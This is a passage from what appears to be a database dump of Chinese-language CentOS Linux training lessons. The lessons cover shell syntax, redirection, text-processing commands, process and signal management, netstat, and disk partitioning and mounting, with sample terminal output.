优先执行引号内的命令，反引号会就近匹配，不可多对反引号同时用<br><br>===============================================================================<br><br><span>使用反斜杆\\防止扩展</span><br><br>echo 命令介绍<br>echo -n -e参数说明<br><span>echo -n 不换行输出<br>echo -e	enable interpretation of backslash escapes 让反斜线解释其转义的内容，一般为\\n换行符，和\\t制表符，例如:</span><br><span>echo \"I want to go \\n home\"</span>	反斜线不解释代表换行符的n<br>输出为	I want to go \\n home<br><span>echo -e \"I want to go \\n home\"</span>	反斜线解释换行符n<br>输出为	I want to go<span>&nbsp;</span><br>home	<br><br></dd><dt>特殊符号</dt><dd><span>特殊符号</span><br><br>#	文档中表示注释<br>\\	转义\\$，没有变量意思 mkdir \"a b\"; rm -rf a\\ b<br>|	管道<br>;	连接多个命令cd;eject<br>\' \'	强引用（在单引号中都视为普通字符）<br>\" \"	弱引用（在双引号中依然保留变量）<br>` `	先执行（shell命令）<br>$	引用变量时的前导符<br>~	用户的家目录<br>/	目录的层次 cd /home/jack<br>!	取反 find / ! -user alice<br>&gt; &gt;&gt;	输出重定向<br>&lt; &lt;&lt;	输入重定向<br>{}	mkdir /var/{dir1,dir2} touch yang{1..1000}<br>()	$()和 ` `一样<br>&amp;	后台符<br><br>===================================================================================<br><br><span>命令执行的判断</span><br>;	cd;eject	没有任何判断机制，仅命令的排序<br>&amp;&amp;	./configure &amp;&amp; make &amp;&amp; make install	前面的命令执行成功后边的命令才继续执行<br>||	ls /var/tianyun2 || mkdir -v /var/tianyun2<br><br><span>注解：</span><br><span>;	没有任何判断机制，仅命令的排序<br>&amp;&amp;	前一程序执行成功（$?==0），则执行<br>|| 前一程序执行失败（$?&lt;&gt;0）, 则执行<br>echo $?	上一命令执行的返回值<br></span></dd><dt>重定向</dt><dd><span>shell功能之输入输出管道和重定向</span><span><br><br></span>===================================================<span><br><br></span><span>&gt;和&gt;&gt; 定向符 1 2 0 文件描述符<br></span><span><br>1&gt;	标准正确输出,当文件存在时则覆盖,当文件不存在时则创建<br>1&gt;&gt;	标准正确输出,当文件存在时则追加,当文件不存在时则创建<br>2&gt;	标准错误输出,当文件存在时则覆盖,当文件不存在时则创建<br>2&gt;&gt;	标准错误输出,当文件存在时则追加,当文件不存在时则创建<br>&amp;&gt;	标准正确和错误输出,当文件存在时则覆盖,当文件不存在时则创建 &amp;&gt; /dev/null<br><br></span>====================================================<br><br><span>文件描述符 0 1 2是基本的，它们用于控制程序的输入和输出</span><span><br></span><br>[root@station230 ~]#<span><span>&nbsp;</span>mail -s \"I love you\" alice</span><br>ssjsjsjjsjss<br>kssjsjss<br>Cc:<span>&nbsp;</span><br>[root@station230 ~]#<span>&nbsp;</span><span>cat</span><br>111<br>111<br><br>============================================<br><br><span>程序的标准输入默认是键盘</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>ls	标准输出</span><br>111 dir40.txt install.log.syslog<br>AAA eioXpacklog.txt notecase-1.9.8-1.fc6.i386.rpm<br>[root@station230 ~]#<span>&nbsp;</span><span>ls /.smslsjksssss</span>	<span>标准错误输出</span><br>ls: /.smslsjksssss: 没有那个文件或目录	<br><br>============================================<br><br><span>标准输出和标准错误默认是终端</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>date 1&gt; date.txt</span><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /sjssjsjsjsssjjdjd 2&gt; error.txt</span><br>[root@station230 ~]#<span>&nbsp;</span><span>echo yyy &gt;file1</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>date 1&gt; /dev/pts/2</span>	终端设备<br>[root@station230 ~]#<span>&nbsp;</span><span>date 1&gt; /dev/null</span>	<br><br>[root@station230 ~]#<span>&nbsp;</span><span>date &gt;&gt; date.txt<span>&nbsp;</span></span><br><br><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /home/ /sss &gt;list.txt 2&gt;error.txt</span><br><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /home/ /sss &gt;list.txt 2&gt;&amp;1</span><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /home/ /sss &amp;&gt;list.txt</span><br>[root@station230 ~]#<span>&nbsp;</span><span>ls /home/ /sss &amp;&gt;/dev/null</span><br><br>============================================<br><br><span>改变输入的方向：</span><br>[root@station230 ~]#<span>&nbsp;</span><span>mail -s \"I love you 02\" alice &lt; /etc/hosts</span><br><br><br><br><br><br><br><br><br><br><br><br><br><br></dd><dt>高级命令</dt><dd><span>高级命令</span><br><br>sort -t\":\" -k3 -n /etc/passwd | head<br>cut -d\":\" -f7 /etc/passwd |sort | uniq<br>cut -d\":\" -f 1,7 /etc/passwd | sort | uniq<br>cut -d\":\" -f 1-7 /etc/passwd | sort | uniq<br>ps aux |sort -k4 -n | tail -5<br>ip addr |grep \'inet\' | awk \'{print $2}\' |awk -F\"/\" \'{print $1}\'<br>df |grep \'/$\' | awk \'{print $5}\' |awk -F\"%\" \'{print $1}\'<br><br>==================================================<br><br>cat -n /etc/passwd | head -20 | tail -2 | rev | tac	rev 左右颠倒 tac上下颠倒<br><br>=================================================<br><br><span>sort<span>&nbsp;</span></span>默认 按首字符排序<br>-n 按整个数字排序<br>-r 反向排序<br>-u uniq 去掉重复行<br><br>================================================<br><br><span>uniq<span>&nbsp;</span></span>默认 去掉相邻重复行<br>u 显示不重复行<br>-d 显示重复行<br>-c 统计重复次数<br><br>=================================================<br><br><span>cut</span><br>-d 指明分割符<br>-f 截取字段<br>-c 截取字符<br><br>cut -d: -f 1 /etc/passwd | head -5<br>cut -d: -f 6 /etc/passwd | head -5<br>cut -d: -f 1,6 /etc/passwd | head -5<br>cut -d: -f 1-3 /etc/passwd | head -5<br>cut -d: -f 1-3,5 /etc/passwd | head -5<br>cut -d\' \' -f 1 /etc/passwd | head -5<br>cut -c 1 /etc/passwd |head -5<br>cut -c 1-4 /etc/passwd |head -5<br>cut -c 1,4 /etc/passwd |head -5<br><br>==================================================<br><br><span>grep<br></span><br>grep \'root\' /etc/passwd<br>grep \'^root\' /etc/passwd<br>grep \'halt$\' /etc/passwd<br>grep -v \'root\' /etc/passwd -v 取反<br><br>=================================================<br><br><span>wc</span><br>-l 统计行数<br>-c 字符数<br>-w 单词数<br><br>================================================<br><br><span>1.统计你系统中有多个用户可以登录?<br></span><br>grep -c /bin/bash /etc/passwd<br>cut -d: -f 7 /etc/passwd | grep bash | uniq -c<br>cut -d: -f 7 /etc/passwd | grep bash | wc -l<br><br>=================================<br><br><span>2.查询网卡对应IP地址<br></span><br>ifconfig eth0 | awk -F\':| +\' \'/Bcast/{ print $4}\'<br>192.168.0.1<br>ifconfig eth0 | head -2 | tail -1 | cut -d: -f2 | cut -d\' \' -f 1<br>ifconfig eth0 | grep Bcast | cut -d: -f2 | cut -d\' \' -f 1<br><br>=================================<br><br><span>3.查询文件状态<br></span><br>stat aa.txt<span>&nbsp;</span><br>File: “aa.txt”<br>Size: 36 Blocks: 8 IO Block: 4096 一般文件<br>Device: 802h/2050d Inode: 33620294 Links: 1<br>Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)<br>Access: 2012-09-29 14:38:22.000000000 +0800<br>Modify: 2012-09-29 14:32:44.000000000 +0800<br>Change: 2012-09-29 14:32:44.000000000 +0800<br><br><span>stat aa.txt | tail -3 | cut -d\' \' -f 3 | cut -d. -f 1</span><br><br></dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.png','centos:latest','2016-10-13 11:08:15',1,NULL,'',0,''),(67,'linux基础课程训练六','和进程相关的linux操作','<dt></dt><dt>说明：我虚拟环境使用的是centos,可以通过 cat /etc/issue来查看，如果发现测试的命令找不到</dt><dt><br></dt><dt>可以使用yum install -y 命令 先插入这个命令再去运行试一试。比如man命令可能运行不了。yum install -y man 之后就可以正常使用了。</dt><dt><br></dt><dt>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</dt><dt><br></dt><dd>进程管理<br><br>=====================================================<br><br>程序&amp;进程<br><br>程序： /usr/sbin/sshd 文件，一般指的是二进制文件，静态&nbsp;<br>进程： 是程序执行的过程，动态，有生命周期的，动态产生和消亡的<br><br>一个程序可能对应多个进程<br>/usr/sbin/httpd<br><br>父进程：程序运行时产生的第一个进程<br>子进程：由父进程衍生出来的进程<br>父进程终止，子进程也会随之被终止<br><br>=====================================================<br><br>作业控制<br><br>sleep 3000 &amp;<br>ctrl + z 将一个shell前台执行的作业挂起到后台<br>nohup sleep 4000 &amp;<br>nohup sleep 4000 &gt;file 2&gt;/dev/null &amp;<br>nohup sleep 4000 &amp;&gt;/dev/null &amp;<br><br>jobs<br>jobs -l	多显示作业的PID<br>bg 作业号	<br>fg 作业号<br>kill 作业号｜进程号<br>+<br>-<br></dd><dt>PS静态查看</dt><dd>PS静态查询进程<br><br>ps aux<br>ps auxf<br>ps -ef<br><br>[root@station230 ~]#&nbsp;ps auxf | grep --color -B2 \'httpd\'<br><br>[root@station230 ~]#&nbsp;pstree |grep --color -B2 -A2 \'bash\'<br>|-gnome-screensav<br>|-gnome-settings----{gnome-settings-}<br>|-gnome-terminal-+-bash-+-grep<br>| | `-pstree<br>| |-gnome-pty-helpe<br><br>[root@station230 ~]#&nbsp;ps aux<br>USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND<br>root 1 0.0 0.0 2164 644 ? Ss 11:36 0:00 init [5]&nbsp;<br><br><br>=======================================================================================<br><br>STAT 运行的状态<br><br>S 处于休眠状态 sleep<br>R 运行<br>Z 僵尸进程 root 3256 0.0 0.0 0 0 ? Z 11:47 0:00 [Xses] &lt;defunct&gt;<br>Ss s进程的领导者，父进程<br>S&lt; &lt;优先级高的进程<br>SN N优先级级低的进程<br>R+ +表示是后台的进程组<br><br>======================================================================================<br><br>[root@station230 ~]#&nbsp;ps auxf | grep httpd<br>root 3699 0.0 0.1 10092 2916 ? Ss 12:13 0:00 /usr/sbin/httpd<br>apache 3700 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3701 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3702 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3703 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3704 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3705 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3706 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>apache 3707 0.0 0.1 10092 2056 ? S 12:13 0:00 \\_ /usr/sbin/httpd<br>root 25358 0.0 0.0 5124 568 pts/2 R+ 14:03 0:00 \\_ grep httpd<br><br>[root@station230 ~]#&nbsp;ps axo user,pid,ppid,%mem,command<br>USER PID PPID %MEM COMMAND<br>root 1 0 0.0 init [5]&nbsp;<br>root 2 1 0.0 [migration/0]<br>root 3 1 0.0 [ksoftirqd/0]<br>root 4 1 0.0 [watchdog/0]<br>root 5 1 0.0 [migration/1]<br>root 6 1 0.0 [ksoftirqd/1]<br><br>[root@station230 ~]#&nbsp;ps axo user,pid,ppid,%mem,command | grep \'httpd\'<br>root 3699 1 0.1 /usr/sbin/httpd<br>apache 3700 3699 0.1 /usr/sbin/httpd<br>apache 3701 3699 0.1 /usr/sbin/httpd<br>apache 3702 3699 0.1 /usr/sbin/httpd<br>apache 3703 3699 0.1 /usr/sbin/httpd<br>apache 3704 3699 0.1 /usr/sbin/httpd<br>apache 3705 3699 0.1 /usr/sbin/httpd<br>apache 3706 3699 0.1 /usr/sbin/httpd<br>apache 3707 3699 0.1 /usr/sbin/httpd<br>root 25414 25390 0.0 grep httpd<br><br>========================================================================================<br><br>查看内存<br><br>[root@station230 ~]#&nbsp;free -m<br>total used free shared buffers cached<br>Mem: 1991 1606 384 0 119 1176<br>-/+ buffers/cache: 311 1680<br>Swap: 16002 0 16002<br><br>buffers 优化写操作&nbsp;<br>cached	提升读的性能<br><br><br><span style=\"font-weight: 700;\">TOP实时查看</span><br></dd><dd>top实时查看进程<br><br>[root@station230 ~]#&nbsp;top<br>[root@station230 ~]#&nbsp;top -d 1<br><br>===============================================================================<br><br>系统整体统计信息<br><br>top - 12:07:32 up 3:01, 4 users, load average: 0.35, 0.42, 0.36<br>Tasks: 200 total, 1 running, 198 sleeping, 0 stopped, 1 zombie<br>Cpu0 : 13.0%us, 6.0%sy, 0.0%ni, 80.0%id, 0.0%wa, 0.0%hi, 1.0%si, 0.0%st<br>Cpu1 : 2.0%us, 0.0%sy, 0.0%ni, 98.0%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st<br>Mem: 3719864k total, 3583104k used, 136760k free, 75772k buffers<br>Swap: 10482404k total, 85888k used, 10396516k free, 2896428k cached<br><br>load average: 1,5,15<br>Cpu(s): 27%us 0.0%ni&nbsp;<br><br>快捷键<br><br>f	修改top显示选项<br>h	查看帮助<br>&lt;	向前<br>&gt;	向后（shift）<br>M	按Memory使用排序（默认降序）<br>P	按CPU使用百分比排序<br>N	以PID的大小排序<br>R	对排序进行反转<br>u	哪一个用户的进程<br>c	显示进程的详细路径<br>k	kill一个进程<br><br>=================================================================================<br><br>优先级<br><br>进程的优先级 -20(高) -- 0 -- 19(低)<br><br>PR 优先级<br>NI nice值 -20(高) 0 19(低)<br><br>注：新的进程默认nice值是0<br><br>通过调整nice值干预程序的优先级<br><br>[root@station230 ~]#&nbsp;nice -n -5 service sshd start<br>[root@station230 ~]#&nbsp;renice -19 2671<br>2671: old priority 0, new priority -19<br><br>[root@station230 ~]#&nbsp;ps axo pid,ni,command | grep \'sshd\'<br>2671 -19 /usr/sbin/sshd<br><br>[root@station230 ~]#&nbsp;ps aux |grep \'sshd\'<br>root 2671 0.0 0.0 7224 1052 ? S&lt;s 11:37 0:00 /usr/sbin/sshd<br>root 25826 0.0 0.0 5124 672 pts/2 R+ 16:17 0:00 grep sshd<br><br>[root@station230 ~]#&nbsp;pgrep sshd<br>2671<br><br>[root@station230 ~]#&nbsp;top -d 1 -p 2671<br>[root@station230 ~]#&nbsp;top -d 1 -p `pgrep sshd`<br>[root@station230 ~]#&nbsp;top -b -n 2 &gt; /tmp/top.txt<br><br><br></dd><dt>信号</dt><dd>信号<br><br>sshd:<br>service sshd stop<br>service sshd restart<br><br>一般情况下，程序本身会带有管理程序，用于启动、停止、重启进程，除了这些外<br>还可以通过向进程发送信号的方式来控制进程。<br><br>==================================================================<br><br>有哪些信号<br>[root@station230 ~]# kill -l<br>1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL<br>5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE<br>9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2<br>13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT<br>17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP<br>21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU<br>25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH<br>29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN<br>35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4<br>39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8<br>43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12<br>47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14<br>51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10<br>55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6<br>59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2<br>63) SIGRTMAX-1 64) SIGRTMAX<br><br>==================================================================<br><br>常用信号<br>1) SIGHUP 重启<br>2) SIGINT ctrl + c<br>9) SIGKILL 强制终止<br>15) SIGTERM 终止（正常退出，干净） 缺省信号<br>17) SIGCHLD ctrl + z<br><br>==================================================================<br><br>[root@station230 ~]#&nbsp;service sshd start<br>启动 sshd： [确定]<br>[root@station230 ~]#&nbsp;pgrep sshd<br>25979<br><br>[root@station230 ~]#&nbsp;kill -1 25979<br>[root@station230 ~]#&nbsp;pgrep sshd<br>25988<br><br>[root@station230 ~]#&nbsp;killall vim&nbsp;//进程名<br>[root@station230 ~]#&nbsp;pkill vim	//进程名<br>[root@station230 ~]#&nbsp;xkill<br><br><br><br><br></dd><dt>netstat</dt><dd>netstat<br><br>[root@station230 ~]#&nbsp;netstat -tnlp	查看正在监听的使用tcp协议的进程（网络进程）<br><br>t tcp协议<br>l listen<br>p PID/Program name<br>n 不反解<br>u udp协议<br><br>[root@station230 ~]#&nbsp;netstat -an |grep \':5900\'	查看连接到本机5900端口的所有客户<br><br>tcp 0 0 0.0.0.0:5900 0.0.0.0:* LISTEN&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.46:49941 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.253:15583 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.55:49964 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:5900 192.168.0.71:33374 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.188:62674 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.19:64631 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.47:48460 ESTABLISHED&nbsp;<br>tcp 10 0 192.168.0.40:5900 192.168.0.57:43368 ESTABLISHED&nbsp;<br>tcp 10 0 192.168.0.40:5900 192.168.0.53:64127 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:5900 192.168.0.42:48030 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.68:16886 ESTABLISHED&nbsp;<br>tcp 10 0 192.168.0.40:5900 192.168.0.36:45525 ESTABLISHED&nbsp;<br>tcp 10 0 192.168.0.40:5900 192.168.0.24:51453 ESTABLISHED&nbsp;<br>tcp 0 236 192.168.0.40:5900 192.168.0.49:13033 ESTABLISHED&nbsp;<br>tcp 10 0 192.168.0.40:5900 192.168.0.59:33514 ESTABLISHED&nbsp;<br><br>[root@station230 ~]#&nbsp;netstat -an |grep \':22\'<br>tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.19:7231 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.52:63240 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.48:59151 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.46:59448 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.59:7980 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.49:53083 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.83:59437 ESTABLISHED&nbsp;<br>tcp 64 0 192.168.0.40:22 192.168.0.47:5211 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.45:34418 ESTABLISHED&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.29:45460 TIME_WAIT&nbsp;<br>tcp 0 0 192.168.0.40:22 192.168.0.11:50314 ESTABLISHED&nbsp;<br><br></dd><dt>proc</dt><dd>/proc<br><br>cat /proc/cmdline	当前内核启动时传递的参数<br>cat /proc/cpuinfo&nbsp;cpu信息<br><br>[root@station230 ~]#&nbsp;grep --color \'processor\' /proc/cpuinfo&nbsp;<br>processor : 0<br>processor : 1<br><br>[root@station230 ~]#&nbsp;grep --color \'flags\' /proc/cpuinfo&nbsp;<br><br>flags : fpu tsc msr pae cx8 apic mtrr cmov pat clflush mmx fxsr sse sse2 ss nx constant_tsc pni vmx ssse3<br>flags : fpu tsc msr pae cx8 apic mtrr cmov pat clflush mmx fxsr sse sse2 ss nx constant_tsc up pni vmx ssse3<br><br>是否支持虚拟化：<br>svm AMD 安全虚拟机<br>vmx Intel<br>[root@station230 ~]#&nbsp;egrep --color \'smv|vmx\' /proc/cpuinfo&nbsp;<br>flags : fpu vme de pse tsc msr pae mce cx8 apic mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx lm constant_tsc pni monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr lahf_lm<br>flags : fpu vme de pse tsc msr pae mce cx8 apic mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe nx lm constant_tsc pni monitor ds_cpl vmx est tm2 ssse3 cx16 xtpr lahf_lm</dd><dt>fuser</dt><dd><span>fuser<br></span><br><span>通过文件（或文件系统）查找使用该文件的程序<br></span><br>[root@station230 ~]#<span>&nbsp;</span><span>fuser -uv /media/</span><br><br>USER PID ACCESS COMMAND<br>/media/: root 24582 ..c.. (root)bash<br><br>[root@station230 ~]#<span>&nbsp;</span><span>fuser -k /media/</span><br>/media/: 24582c<br><br><br><br>[root@station230 ~]#<span>&nbsp;</span><span>vmstat<span>&nbsp;</span></span><br>[root@station230 ~]#<span>&nbsp;</span><span>which vmstat</span><br>/usr/bin/vmstat<br>[root@station230 ~]#<span>&nbsp;</span><span>rpm -qf /usr/bin/vmstat<span>&nbsp;</span></span><br>procps-3.2.7-18.el5<br><br>=========================================================<br><br><span>vmstat, sar 和 iostat 系统监视命令</span><br>[root@station230 ~]#<span>&nbsp;</span><span>yum provides */iostat</span><br>[root@station230 ~]#<span>&nbsp;</span><span>yum -y install sysstat</span></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.png','centos:latest','2016-10-13 11:10:23',1,NULL,'',0,''),(68,'linux基础课程训练七','文件系统相关的linux操作命令','<dt>说明：我虚拟环境使用的是centos,可以通过 cat /etc/issue来查看，如果发现测试的命令找不到</dt><dt><br></dt><dt>可以使用yum install -y 命令 先插入这个命令再去运行试一试。比如man命令可能运行不了。yum install -y man 之后就可以正常使用了。</dt><dt><br></dt><dt>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</dt><dt><br></dt><dt>存储管理：<br><br>基本的存储管理：分区、格式化、挂载<br><br>MBR分区方式 fdisk 不支持大于2T的硬盘<br>GPT分区方式 parted 支持大于2T的硬盘<br><br>IDE&nbsp;/dev/hd*<br>SCSI,SATA,USB	/dev/sd*<br><br>第一块SATA<br>/dev/sda<br>/dev/sda1<br><br>HP<br>/dev/cciss/c0d0p1<br>/dev/cciss/c0d0p2<br><dl><dt>MBR分区</dt><dd>MBR分区<br><br>================================================================================<br><br>1. 查看新设备是否发现<br><br>ll /dev/sd*<br>fdisk -ul	//u以扇区的方式<br><br>Disk /dev/sda: 500.1 GB, 500107862016 bytes<br>255 heads, 63 sectors/track, 60801 cylinders, total 976773168 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br><br>Device Boot Start End Blocks Id System<br>/dev/sda1 * 63 208844 104391 83 Linux<br>/dev/sda2 208845 512216459 256003807+ 83 Linux<br>/dev/sda3 512216460 533181284 10482412+ 82 Linux swap / Solaris<br>/dev/sda4 533181285 976768064 221793390 5 Extended<br>/dev/sda5 533181348 728515619 97667136 83 Linux<br><br>=================================================================================<br><br>2. 分区<br><br>[root@station230 ~]#&nbsp;fdisk -u /dev/hdc<br>[root@station230 ~]#&nbsp;partx -a /dev/hdc	让内核刷新分区表<br>[root@station230 ~]#&nbsp;ll /dev/sd*<br><br>=================================================================================<br><br>3. 格式化（创建文件系统）<br><br>Windows: FAT,FAT32,NTFS<br>Linux: FAT,Ext2,Ext3,Ext4<br><br>[root@station230 ~]#&nbsp;mkfs.ext3 /dev/hdc9<br><br>mke2fs 1.39 (29-May-2006)<br>Filesystem label=<br>OS type: Linux<br>Block size=4096 (log=2)<br>Fragment size=4096 (log=2)<br>122112 inodes, 244140 blocks<br>12207 blocks (5.00%) reserved for the super user<br>First data block=0<br>Maximum filesystem blocks=251658240<br>8 block groups<br>32768 blocks per group, 32768 fragments per group<br>15264 inodes per group<br>Superblock backups stored on blocks:&nbsp;<br>32768, 98304, 163840, 229376<br><br>Writing inode tables: done&nbsp;<br>Creating journal (4096 blocks): done<br>Writing superblocks and filesystem accounting information: done<br><br>This filesystem will be automatically checked every 24 mounts or<br>180 days, whichever comes first. Use tune2fs -c or -i to override.<br><br>================================================================================<br><br>4. 挂载<br><br>临时挂载<br>=======<br><br>[root@station230 ~]#&nbsp;mkdir /mnt/date<br>[root@station230 ~]#&nbsp;mount /dev/hdc9 /mnt/date/	<br>[root@station230 ~]#&nbsp;df -a -Th<br><br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/hdc3 ext3 19G 1.1G 17G 7% /<br>proc proc 0 0 0 - /proc<br>sysfs sysfs 0 0 0 - /sys<br>devpts devpts 0 0 0 - /dev/pts<br>/dev/hdc8 ext3 9.5G 159M 8.9G 2% /home<br>/dev/hdc6 ext3 19G 3.4G 15G 19% /usr<br>/dev/hdc5 ext3 19G 226M 18G 2% /usr/local<br>/dev/hdc2 ext3 48G 878M 44G 2% /var<br>/dev/hdc1 ext3 487M 17M 445M 4% /boot<br>tmpfs tmpfs 996M 0 996M 0% /dev/shm<br>none binfmt_misc 0 0 0 - /proc/sys/fs/binfmt_misc<br>sunrpc rpc_pipefs 0 0 0 - /var/lib/nfs/rpc_pipefs<br>none vmblock 0.0K 0.0K 0.0K - /proc/fs/vmblock/mountPoint<br>/dev/hdc9 ext3 939M 18M 874M 2% /mnt/date<br>[root@station230 ~]# umount /dev/hdc9<br><br>挂载永久生效<br>==========	<br><br>vim /etc/fstab<br><br>/dev/hdc9	/mnt/date	ext3	defaults	0	0<br>设备名	挂载点	类型	挂载选项	是否备份 检查<br><br>[root@station230 ~]#&nbsp;mount -a	读/etc/fstab<br>[root@station230 ~]#&nbsp;df -Th<br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/hdc3 ext3 19G 1.1G 17G 7% /<br>/dev/hdc8 ext3 9.5G 159M 8.9G 2% /home<br>/dev/hdc6 ext3 19G 3.4G 15G 19% /usr<br>/dev/hdc5 ext3 19G 226M 18G 2% /usr/local<br>/dev/hdc2 ext3 48G 878M 44G 2% /var<br>/dev/hdc1 ext3 487M 17M 445M 4% /boot<br>tmpfs tmpfs 996M 0 996M 0% /dev/shm<br>/dev/hdc9 ext3 939M 18M 874M 2% /mnt/date<br><br>[root@station230 ~]#&nbsp;mount /dev/hdc9 /mnt/date/	用设备名挂载(不推荐)s<br><br>其他三种挂载形式<br>LABEL<br>UUID<br>UDEV<br><br>UUID方式挂载<br>===========<br><br>[root@station230 ~]#&nbsp;blkid<br>/dev/sda3: LABEL=\"SWAP-sda3\" TYPE=\"swap\"&nbsp;<br>/dev/sda2: LABEL=\"/\" UUID=\"5734c1f4-0fd0-4bad-8b65-06a3e621ce9a\" TYPE=\"ext3\"&nbsp;<br>/dev/sda1: LABEL=\"/boot\" UUID=\"80e2551f-4e01-467d-bc06-5c5483845a50\" TYPE=\"ext3\"&nbsp;<br>/dev/loop0: LABEL=\"RHEL/5.8 i386 DVD\" TYPE=\"iso9660\"&nbsp;<br><br>[root@station230 ~]#&nbsp;vim /etc/fstab<br>UUID=\"a2a2acc5-3feb-477e-b0dc-bdd099d8ce58\" /mnt/date ext3 defaults 0 0<br><br><br><br><br></dd><dt>dumpe2fs tune2fs</dt><dd>dumpe2fs /dev/sda5<br>tune2fs -l /dev/sda5<br>tune2fs -c 50 /dev/sda5&nbsp;修改挂载最大次数<br>tune2fs -C 5 /dev/sda5&nbsp;修改已经挂载的次数<br>tune2fs -O ^has_journal /dev/sda5&nbsp;ext3转换ext2<br>tune2fs -O has_journal /dev/sda5&nbsp;ext2转ext3<br>tune2fs -o acl /dev/sda5&nbsp;添加默认属性<br>tune2fs -o ^acl /dev/sda5&nbsp;去掉默认属性<br>tune2fs -L disk5 /dev/sda5&nbsp;修改卷标</dd><dt>mount挂载</dt><dd>mount命令语法<br><br>mount -t 文件系统类型 -o 选项 设备文件 挂载点<br>mount /dev/sda5 /mnt/dir5<br><br>=================================================================================<br><br>iso的使用<br><br>[root@station230 ~]#&nbsp;dd if=/dev/cdrom of=/cd.iso	光盘制作成iso(不需要挂载光盘)<br>[root@station230 ~]#&nbsp;mkisofs -o etc.iso -r /etc/<br>[root@station230 ~]#&nbsp;file etc.iso&nbsp;<br>etc.iso: ISO 9660 CD-ROM filesystem data \'CDROM<br><br>[root@station230 ~]#&nbsp;mount -o loop etc.iso /media/<br>[root@station230 ~]#&nbsp;df -Th<br>文件系统 类型 容量 已用 可用 已用% 挂载点<br>/dev/hdc3 ext3 19G 1.8G 17G 10% /<br>/dev/hdc8 ext3 9.5G 159M 8.9G 2% /home<br>/dev/hdc6 ext3 19G 3.4G 15G 19% /usr<br>/dev/hdc5 ext3 19G 226M 18G 2% /usr/local<br>/dev/hdc2 ext3 48G 878M 44G 2% /var<br>/dev/hdc1 ext3 487M 17M 445M 4% /boot<br>tmpfs tmpfs 996M 0 996M 0% /dev/shm<br>/dev/hdc9 ext3 939M 88M 804M 10% /mnt/date<br>/disk20.img ext3 49M 4.9M 42M 11% /mnt/disk20<br>/root/etc.iso<br>iso9660 107M 107M 0 100% /media<br><br>注：<br>[root@station230 ~]#&nbsp;mount -o ro /mnt/date/&nbsp;读/etc/fstab<br>[root@station230 